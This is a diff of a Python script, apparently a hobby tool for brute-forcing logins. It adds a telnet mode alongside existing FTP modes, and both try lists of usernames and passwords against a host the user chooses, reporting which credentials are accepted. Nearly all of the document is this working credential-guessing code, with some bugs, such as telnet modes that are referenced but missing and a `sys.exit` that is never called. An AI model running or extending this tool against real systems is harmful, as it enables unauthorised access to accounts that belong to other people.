@@ -2,13 +2,15 @@
 import sys
 import time
 from ftplib import FTP, error_perm
+import socket
 
 # List and dictonaries
 modes = {
-    'a': 'ftp'
+    'a': 'ftp',
+    'b': 'telnet'
 }
 
-ftp_modes = {
+methods = {
     '1': 'use the same user and a list of passwords',
     '2': 'use a list of users and the same password',
     '3': 'use lists for both user and password'
@@ -19,7 +21,7 @@ info = {}
 # Ftp
 def ftp():
     while True:
-        for number, mode in ftp_modes.items():
+        for number, mode in methods.items():
             print(number + ' -> ' + mode)
         selected_mode = input(
             'Please select the ftp option from the previos ones by typing the correspondive number: '
@@ -28,18 +30,18 @@ def ftp():
             print('Bye!')
             sys.exit
         elif selected_mode == '1':
-            ftp_mode_1_connect()
+            ftp_1_connect()
             return None
         elif selected_mode == '2':
-            ftp_mode_2_connect()
+            ftp_2_connect()
             return None
         elif selected_mode == '3':
-            ftp_mode_3_connect()
+            ftp_3_connect()
             return None
         else:
             print('Mode not found, please try again.')
 
-def ftp_mode_1_info():
+def ftp_1_info():
     while True:
         info['host'] = input(
             'Enter the host: '
@@ -61,8 +63,8 @@ def ftp_mode_1_info():
         else:
             return password_list
 
-def ftp_mode_1_connect():
-    password_list = ftp_mode_1_info()
+def ftp_1_connect():
+    password_list = ftp_1_info()
     ftp = FTP()
     ftp.connect(host=info['host'], port=info['port']) # DA METTERE UN BLOCCO TRY EXCEPT
     for password in password_list:
@@ -75,7 +77,7 @@ def ftp_mode_1_connect():
             break
     ftp.quit()
 
-def ftp_mode_2_info():
+def ftp_2_info():
     while True:
         info['host'] = input(
             'Enter the host: '
@@ -97,8 +99,8 @@ def ftp_mode_2_info():
         else:
             return user_list
         
-def ftp_mode_2_connect():
-    user_list = ftp_mode_2_info()
+def ftp_2_connect():
+    user_list = ftp_2_info()
     ftp = FTP()
     ftp.connect(host=info['host'], port=info['port'])
     for user in user_list:
@@ -111,7 +113,7 @@ def ftp_mode_2_connect():
             break
     ftp.quit()
 
-def ftp_mode_3_info():
+def ftp_3_info():
     while True:
         info['host'] = input(
             'Enter the host:\t'
@@ -141,8 +143,8 @@ def ftp_mode_3_info():
             info['password_list'] = password_list
             return None
 
-def ftp_mode_3_connect():
-    ftp_mode_3_info()
+def ftp_3_connect():
+    ftp_3_info()
     user_list = info['user_list']
     password_list = info['password_list']
     ftp = FTP()
@@ -159,6 +161,77 @@ def ftp_mode_3_connect():
     ftp.quit()
 
 
+# Telnet
+def telnet():
+    while True:
+        for number, mode in methods.items():
+            print(number + ' -> ' + mode)
+        selected_mode = input(
+            'Please select the telnet option from the previos ones by typing the correspondive number: '
+            )
+        if selected_mode == 'q':
+            print('Bye!')
+            sys.exit
+        elif selected_mode == '1':
+            telnet_1_connect()
+            return None
+        elif selected_mode == '2':
+            telnet_2_connect()
+            return None
+        elif selected_mode == '3':
+            telnet_3_connect()
+            return None
+        else:
+            print('Mode not found, please try again.')
+
+def telnet_1_info():
+    while True:
+        info['host'] = input(
+           'Enter the host: '
+        )
+        info['port'] = int(input(
+            'Enter the port: '
+        ))
+        info['user'] = input(
+            'Enter the user: '
+        )
+        password_list_file = input(
+            "Please type the file's path containing the passwords' list: "
+        )
+        try:
+            with open(password_list_file, 'r', encoding='utf-8') as file:
+                password_list = [line.strip() for line in file]
+        except FileNotFoundError:
+            print('This file does not exist, please try again.')
+        else:
+            return password_list
+
+def telnet_1_connect():
+    password_list = telnet_1_info()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((info['host'], info['port']))
+    time.sleep(0.5)
+    for password in password_list:
+        s.recv(1024).decode('utf-8', 'ignore')
+        s.sendall(f'{info['user']}\r\n'.encode('utf-8'))
+        time.sleep(0.5)
+        s.recv(1024).decode('utf-8', 'ignore')
+        s.sendall(f'{password}\r\n'.encode('utf-8'))
+        time.sleep(0.5)
+        answer = (s.recv(1024).decode('utf-8', 'ignore'))
+        if answer.lower() == 'denied' or answer.lower() == 'denied':
+            print(f'Login failed with user "{info['user']}" and password "{password}".')
+            continue
+        else:
+            print(f'Login GRANTED with user "{info['user']}" and password "{password}".')
+            break
+            
+            
+
+
+
+
+# Input mode
 def input_mode():
     while True:
         print('Welcome...')
@@ -173,6 +246,9 @@ def input_mode():
         elif selected_mode == 'a':
             ftp()
             return None
+        elif selected_mode == 'b':
+            telnet()
+            return None
         else:
             print('Mode not found, please try again.')
 
@@ -180,3 +256,4 @@ input_mode()
 
 # BISOGNA METTERE UN IF Q DOVE CI SONO GLI INPUT IM MODO CHE SE VOLESSE USCIRE LO PUO FARE
 # BISOGNA PENSARE AL DELAY TRA UN TENTATIVO E UN ALTRO PER EVITARE DANNI
+# Mettere un opzione per lasciare la porta di default o user vuoto
